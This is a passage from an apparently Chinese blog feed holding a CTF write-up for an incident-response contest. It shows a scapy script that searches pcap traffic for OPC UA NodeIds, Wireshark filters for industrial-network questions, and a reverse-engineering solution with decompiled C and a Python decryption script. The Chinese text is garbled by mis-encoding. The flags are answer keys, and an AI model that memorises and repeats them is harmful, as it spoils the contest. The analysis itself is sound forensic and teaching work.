class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(b)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_matches_in_payload</span>(<span class="hljs-params">payload_bytes</span>):<br>    matches = []<br>    <span class="hljs-comment"># æ–‡æœ¬æ¨¡å¼</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> RE_NODEID_TEXT.finditer(payload_bytes):<br>        <span class="hljs-keyword">try</span>:<br>            matches.append(m.group(<span class="hljs-number">0</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br>        <span class="hljs-keyword">except</span>:<br>            matches.append(<span class="hljs-built_in">str</span>(m.group(<span class="hljs-number">0</span>)))<br>    <span class="hljs-comment"># UTF-16LE æ¨¡å¼ -&gt; è§£ç ä¸ºæ­£å¸¸å­—ç¬¦ä¸²å†æŠŠ \x00 å»æ‰</span><br>    <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> RE_NODEID_UTF16.finditer(payload_bytes):<br>        <span class="hljs-keyword">try</span>:<br>            s = m.group(<span class="hljs-number">0</span>).decode(<span class="hljs-string">&#x27;utf-16le&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>            matches.append(s)<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-comment"># é€€å›ï¼šç§»é™¤ nulls</span><br>            cleaned = m.group(<span class="hljs-number">0</span>).replace(<span class="hljs-string">b&#x27;\x00&#x27;</span>, <span class="hljs-string">b&#x27;&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>            matches.append(cleaned)<br>    <span class="hljs-comment"># å»é‡ä½†ä¿æŒé¡ºåº</span><br>    seen = <span class="hljs-built_in">set</span>()<br>    uniq = []<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> matches:<br>        <span class="hljs-keyword">if</span> x <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> seen:<br>            seen.add(x)<br>            uniq.append(x)<br>    <span class="hljs-keyword">return</span> uniq<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_pcap</span>(<span class="hljs-params">path</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] è¯»å– pcapï¼š<span class="hljs-subst">&#123;path&#125;</span>&quot;</span>)<br>    pkts = rdpcap(path)<br>    results = []<br>    <span class="hljs-keyword">for</span> idx, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(pkts, start=<span class="hljs-number">1</span>):<br>        payload = <span class="hljs-string">b&#x27;&#x27;</span><br>        ts = <span class="hljs-literal">None</span><br>        src = dst = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-comment"># å°è¯•æå– Raw å±‚</span><br>        <span class="hljs-keyword">if</span> Raw <span class="hljs-keyword">in</span> p:<br>            payload = <span class="hljs-built_in">bytes</span>(p[Raw].load)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># æœ‰äº›åŒ…å¯é€šè¿‡ TCP/UDP å±‚ payload å±æ€§æ‹¿åˆ°</span><br>            <span class="hljs-keyword">if</span> TCP <span class="hljs-keyword">in</span> p <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(p[TCP], <span class="hljs-string">&#x27;payload&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(p[TCP].payload))&gt;<span class="hljs-number">0</span>:<br>                payload = <span class="hljs-built_in">bytes</span>(p[TCP].payload)<br>            <span class="hljs-keyword">elif</span> UDP <span class="hljs-keyword">in</span> p <span class="hljs-keyword">and</span> <span class="hljs-built_in">hasattr</span>(p[UDP], <span class="hljs-string">&#x27;payload&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(<span class="hljs-built_in">bytes</span>(p[UDP].payload))&gt;<span class="hljs-number">0</span>:<br>                payload = <span class="hljs-built_in">bytes</span>(p[UDP].payload)<br><br>        <span class="hljs-comment"># æ—¶é—´æˆ³ï¼ˆscapy Packet æœ‰ time å±æ€§ï¼‰</span><br>        ts = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;time&#x27;</span>, <span class="hljs-literal">None</span>)<br>        <span class="hljs-keyword">if</span> ts:<br>            timestr = datetime.utcfromtimestamp(ts).strftime(<span class="hljs-string">&#x27;%Y-%m-%dT%H:%M:%SZ&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            timestr = <span class="hljs-string">&quot;&quot;</span><br><br>        <span class="hljs-comment"># æº/ç›®çš„</span><br>        <span class="hljs-keyword">if</span> IP <span class="hljs-keyword">in</span> p:<br>            src = p[IP].src<br>            dst = p[IP].dst<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># é IP å±‚å¯å°è¯•å±‚æ¬¡ç»“æ„çš„ src/dst å­—æ®µï¼ˆæˆ–ä¿æŒä¸ºç©ºï¼‰</span><br>            src = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;src&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            dst = <span class="hljs-built_in">getattr</span>(p, <span class="hljs-string">&#x27;dst&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> payload <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(payload) &gt; <span class="hljs-number">0</span>:<br>            matches = find_matches_in_payload(payload)<br>            <span class="hljs-keyword">if</span> matches:<br>                <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> matches:<br>                    results.append(&#123;<br>                        <span class="hljs-string">&#x27;pkt_index&#x27;</span>: idx,<br>                        <span class="hljs-string">&#x27;time&#x27;</span>: timestr,<br>                        <span class="hljs-string">&#x27;src&#x27;</span>: src,<br>                        <span class="hljs-string">&#x27;dst&#x27;</span>: dst,<br>                        <span class="hljs-string">&#x27;nodeid&#x27;</span>: m,<br>                    &#125;)<br>    <span class="hljs-keyword">return</span> results<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">print_results</span>(<span class="hljs-params">results</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> results:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!] æœªå‘ç°åŒ¹é…çš„ NodeIdï¼ˆæ–‡æœ¬æˆ– UTF-16LEï¼‰ã€‚è‹¥æµé‡åŠ å¯†åˆ™éœ€è¦è§£å¯†åå†åˆ†æã€‚&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å…±å‘ç° <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(results)&#125;</span> æ¡åŒ¹é…ï¼š&quot;</span>)<br>    <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;#<span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;pkt_index&#x27;</span>]:6d&#125;</span>  <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;time&#x27;</span>]&#125;</span>  <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;src&#x27;</span>]&#125;</span> -&gt; <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;dst&#x27;</span>]&#125;</span>   <span class="hljs-subst">&#123;r[<span class="hljs-string">&#x27;nodeid&#x27;</span>]&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_csv</span>(<span class="hljs-params">results, outpath</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(outpath, <span class="hljs-string">&#x27;w&#x27;</span>, newline=<span class="hljs-string">&#x27;&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        writer = csv.DictWriter(f, fieldnames=[<span class="hljs-string">&#x27;pkt_index&#x27;</span>,<span class="hljs-string">&#x27;time&#x27;</span>,<span class="hljs-string">&#x27;src&#x27;</span>,<span class="hljs-string">&#x27;dst&#x27;</span>,<span class="hljs-string">&#x27;nodeid&#x27;</span>])<br>        writer.writeheader()<br>        <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> results:<br>            writer.writerow(r)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] å·²ä¿å­˜ CSV: <span class="hljs-subst">&#123;outpath&#125;</span>&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Usage: python find_nodeid_in_pcap.py traffic.pcap [-o out.csv]&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    pcap = sys.argv[<span class="hljs-number">1</span>]<br>    out = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> sys.argv[<span class="hljs-number">2</span>] <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;-o&#x27;</span>,<span class="hljs-string">&#x27;--out&#x27;</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(sys.argv) &gt;=<span class="hljs-number">4</span>:<br>        out = sys.argv[<span class="hljs-number">3</span>]<br>    res = scan_pcap(pcap)<br>    print_results(res)<br>    <span class="hljs-keyword">if</span> out:<br>        save_csv(res, out)<br><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/53eee1be9c176179.png"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">flag&#123;ns<span class="hljs-operator">=</span><span class="hljs-number">2</span><span class="hljs-comment">;s=Pump/SpeedSetpoint&#125;</span><br></code></pre></td></tr></table></figure><h2 id="Q3"><a href="#Q3" class="headerlink" title="Q3"></a>Q3</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">å·¥ç¨‹ç«™åŸŸåè§£æç»“æœ<br>æ‰¾å‡ºå·¥ç¨‹ç«™åŸŸå engws<span class="hljs-selector-class">.plant</span><span class="hljs-selector-class">.local</span> çš„ A è®°å½•è§£æç»“æœï¼ˆç›®æ ‡ IPï¼‰ã€‚<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤æœç´¢</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">dns &amp;&amp; (dns<span class="hljs-selector-class">.qry</span><span class="hljs-selector-class">.name</span> == <span class="hljs-string">&quot;engws.plant.local&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8c11a5269119715f.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">10.0.0.8</span>&#125;<br></code></pre></td></tr></table></figure><h2 id="Q4"><a href="#Q4" class="headerlink" title="Q4"></a>Q4</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby">ç¡®å®š <span class="hljs-variable constant_">HMI</span>ï¼ˆæºï¼š<span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.xï¼‰åˆ°å·¥ç¨‹ç«™ï¼ˆç›®çš„ï¼š<span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.xï¼‰ä¸Šé¦–ä¸ªæˆåŠŸå‘èµ·çš„æ—¶é—´ç‚¹ã€‚<br>æäº¤æ ¼å¼ï¼šflag&#123;<span class="hljs-variable constant_">YYYY</span>-<span class="hljs-variable constant_">MM</span>-<span class="hljs-variable constant_">DDTHH</span><span class="hljs-symbol">:MM</span><span class="hljs-symbol">:SSZ</span>&#125;ï¼ˆ<span class="hljs-variable constant_">UTC</span>ï¼Œç²¾ç¡®åˆ°ç§’ï¼‰<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ip</span>.src == <span class="hljs-number">10.0.0.5</span> &amp;&amp; ip.dst == <span class="hljs-number">10.0.0.8</span> &amp;&amp;tcp<br></code></pre></td></tr></table></figure><p>æ¡æ‰‹æˆåŠŸæ—¶é—´</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>-<span class="hljs-number">03</span>-<span class="hljs-number">12</span>T14:<span class="hljs-number">22</span>:<span class="hljs-number">09</span>Z&#125;<br></code></pre></td></tr></table></figure><h2 id="Q5"><a href="#Q5" class="headerlink" title="Q5"></a>Q5</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">åœ¨æ¨ªå‘åä¸ä¹…ï¼ŒHMI å¯¹å·¥ç¨‹ç«™å‘èµ·äº† HTTP è¯·æ±‚ã€‚æäº¤è¯·æ±‚çš„ Host ä¸ URIï¼Œç”¨ä¸‹åˆ’çº¿è¿æ¥ã€‚<br></code></pre></td></tr></table></figure><p>è¿‡æ»¤æœç´¢</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">ip.dst</span> == <span class="hljs-number">10.0</span>.<span class="hljs-number">0.8</span> &amp;&amp; http.request<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/0a4f026c6b49e61a.png"></p><p>æ‹¼æ¥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag&#123;engws.plant.local_/rpc&#125;<br></code></pre></td></tr></table></figure><h1 id="é€†å‘"><a href="#é€†å‘" class="headerlink" title="é€†å‘"></a>é€†å‘</h1><h2 id="Brainiac"><a href="#Brainiac" class="headerlink" title="Brainiac"></a>Brainiac</h2><p>æœ‰å¼‚å¸¸å¤„ç†ï¼Œè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼Œåœ¨ Handler é‡Œä¸‹æ–­ç‚¹ï¼Œè§¦å‘å¼‚å¸¸æ—¶ä¼šæŠŠ <code>RIP</code> è®¾ç½®ä¸º <code>ModuleHandleA + 2</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/5bfcce3a4571801a.png"></p><p>åœ¨ process option é‡Œå¡«å†™</p><p><img src="https://img.dkdun.cn/v1/2025/12/a07635952d9fd836.png"></p><p>è°ƒè¯•è·Ÿè¿›ï¼Œå‡ºç° MZ å­—æ ·æ—¶æŒ‰ P åˆ›å»ºå‡½æ•°ï¼Œå‡ºç°å¦‚ä¸‹å‡½æ•°</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f32abb2fb3ba939.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_7FF7D1540002</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// r9d</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// r11d</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// r10d</span><br>  __int64 v6; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// r8</span><br>  <span class="hljs-type">int</span> v8; <span class="hljs-comment">// edx</span><br>  __int64 v9; <span class="hljs-comment">// rax</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp+8h] BYREF</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+28h] [rbp+10h] BYREF</span><br><br>  v2 = *(_DWORD *)(a1 + <span class="hljs-number">16</span>);<br>  <span class="hljs-keyword">if</span> ( (v2 &amp; <span class="hljs-number">7</span>) != <span class="hljs-number">0</span> )<br>    v2 = (v2 &amp; <span class="hljs-number">0xFFFFFFF8</span>) + <span class="hljs-number">8</span>;<br>  v3 = __rdtsc();<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = v3 ^ HIDWORD(v3) ^ <span class="hljs-number">0x76543210</span>;<br>  *(_DWORD *)(v2 + *(_QWORD *)(a1 + <span class="hljs-number">8</span>)) = v5;<br>  *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">4</span>i64) = *(_DWORD *)(a1 + <span class="hljs-number">16</span>) ^ v5 ^ <span class="hljs-number">0x89ABCDEF</span>;<br>  *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">8</span>i64) = <span class="hljs-number">1330403418</span>;<br>  <span class="hljs-keyword">for</span> ( *(_DWORD *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v2 + <span class="hljs-number">12</span>i64) = <span class="hljs-number">1380272963</span>; v4 &lt; v2; v7[<span class="hljs-number">1</span>] = v5 ^ v8 )<br>  &#123;<br>    v6 = v4;<br>    v4 += <span class="hljs-number">8</span>;<br>    v7 = (<span class="hljs-type">int</span> *)(*(_QWORD *)(a1 + <span class="hljs-number">8</span>) + v6);<br>    v8 = *v7;<br>    *v7 = v7[<span class="hljs-number">1</span>] ^ (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5);<br>    v5 = <span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5);<br>  &#125;<br>  v9 = *(_QWORD *)a1 + <span class="hljs-number">4217</span>i64;<br>  v11 = <span class="hljs-number">8</span>i64;<br>  v12 = v9;<br>  (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64 *, __int64 *, __int64, __int64))(a1 + <span class="hljs-number">24</span>))(<span class="hljs-number">-1</span>i64, &amp;v12, &amp;v11, <span class="hljs-number">4</span>i64, a1 + <span class="hljs-number">20</span>);<br>  *(_QWORD *)(*(_QWORD *)a1 + <span class="hljs-number">4217</span>i64) = <span class="hljs-number">0</span>i64;<br>  (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64 *, __int64 *, _QWORD, __int64))(a1 + <span class="hljs-number">24</span>))(<br>    <span class="hljs-number">-1</span>i64,<br>    &amp;v12,<br>    &amp;v11,<br>    *(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">20</span>),<br>    a1 + <span class="hljs-number">20</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;<br>&#125;<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">EF 1C FD 7A 7C 33 44 12 EB A0 21 A5 C0 68 74 03</span><br><span class="hljs-string">02 DA B0 DA B3 25 56 99 73 BE 39 05 A2 97 29 F2</span><br><span class="hljs-string">D8 63 35 4E F7 A1 11 E6 E5 6F A9 DA F9 4E B7 B3</span><br><span class="hljs-string">A7 C2 42 EC A4 62 DA 92 77 E4 37 C2 AF 29 9C 4B</span><br><span class="hljs-string">5A 58 4C 4F 43 4B 45 52</span><br><span class="hljs-string">&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>))<br><br><br>encrypted_data = <span class="hljs-built_in">bytearray</span>(ciphertext[:<span class="hljs-number">56</span>])<br>metadata = ciphertext[<span class="hljs-number">56</span>:]<br><br>v5_stored = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, metadata[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>size_xor = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, metadata[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]<br>original_size = size_xor ^ v5_stored ^ <span class="hljs-number">0x89ABCDEF</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;å¯†æ–‡é•¿åº¦: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(ciphertext)&#125;</span> å­—èŠ‚&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ç§å­ v5: 0x<span class="hljs-subst">&#123;v5_stored:08X&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;åŸå§‹å¤§å°: <span class="hljs-subst">&#123;original_size&#125;</span> å­—èŠ‚\n&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_combined</span>(<span class="hljs-params">data, seed, original_size</span>):<br><br>    result = <span class="hljs-built_in">bytearray</span>()<br>    v5_before = seed<br>    v5_after = seed<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(data), <span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> i + <span class="hljs-number">7</span> &lt; <span class="hljs-built_in">len</span>(data):<br>            enc0 = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data[i:i + <span class="hljs-number">4</span>])[<span class="hljs-number">0</span>]<br>            enc1 = struct.unpack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, data[i + <span class="hljs-number">4</span>:i + <span class="hljs-number">8</span>])[<span class="hljs-number">0</span>]<br>            <br>            <span class="hljs-comment"># ç­–ç•¥1ï¼šv5å…ˆæ›´æ–°ï¼ˆç”¨äºè§£å¯†å‰4å­—èŠ‚ï¼‰</span><br>            v5_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v5_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            key_before = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_before) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            part1 = enc1 ^ v5_before  <span class="hljs-comment"># å‰4å­—èŠ‚</span><br>            <br>            <span class="hljs-comment"># ç­–ç•¥2ï¼šv5åæ›´æ–°ï¼ˆç”¨äºè§£å¯†å4å­—èŠ‚ï¼‰</span><br>            key_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            part2 = enc0 ^ key_after  <span class="hljs-comment"># å4å­—èŠ‚</span><br>            v5_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            v5_after = (<span class="hljs-number">1919810</span> - <span class="hljs-number">86066498</span> * v5_after) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>            <br>            <span class="hljs-comment"># åˆå¹¶ï¼šå‰4å­—èŠ‚ + å4å­—èŠ‚</span><br>            result.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, part1))<br>            result.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, part2))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result[:original_size])<br><br><br>flag = decrypt_combined(encrypted_data, v5_stored, original_size)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å®Œæ•´FLAGè§£å¯†ç»“æœ:&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Hex: <span class="hljs-subst">&#123;<span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02X&#125;</span>&#x27;</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ASCII: <span class="hljs-subst">&#123;flag.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>)&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">60</span>)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;flag&#123;&#x27;</span> <span class="hljs-keyword">in</span> flag <span class="hljs-keyword">and</span> <span class="hljs-string">b&#x27;&#125;&#x27;</span> <span class="hljs-keyword">in</span> flag:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nâœ“âœ“âœ“ æˆåŠŸè§£å¯†ï¼ âœ“âœ“âœ“&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nFLAG: <span class="hljs-subst">&#123;flag.decode(<span class="hljs-string">&#x27;ascii&#x27;</span>)&#125;</span>&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nâš  è§£å¯†å¯èƒ½æœ‰è¯¯&quot;</span>)<br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°ç»“æœ</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">flag&#123;<span class="hljs-symbol">M4lf0Rmed_Pe_W1th_B4d_ReL0Ca71oNs@</span>solarsec_202510&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>åº”æ€¥å“åº”&amp;å–è¯</category>
      
    </categories>
    
    
    <tags>
      
      <tag>åº”æ€¥å“åº”</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025å¹´Solaråº”æ€¥å“åº”å…¬ç›Šæœˆèµ›-9æœˆ</title>
    <link href="/2025/10/10/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-9%E6%9C%88/"/>
    <url>/2025/10/10/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-9%E6%9C%88/</url>
    
